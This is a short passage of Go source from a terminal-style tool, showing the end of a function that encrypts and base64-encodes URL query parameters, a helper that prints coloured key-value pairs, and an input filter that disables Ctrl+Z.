		enc_params := make([]byte, len(dec_params)+1)
		c.XORKeyStream(enc_params[1:], []byte(dec_params))
		enc_params[0] = crc

		key_val := enc_key + base64.RawURLEncoding.EncodeToString([]byte(enc_params))
		ret += "?" + key_arg + "=" + key_val
	}
	return ret
}

func (t *Terminal) sprintVar(k string, v string) string {
	vc := color.New(color.FgYellow)
	return k + ": " + vc.Sprint(v)
}

func (t *Terminal) filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}
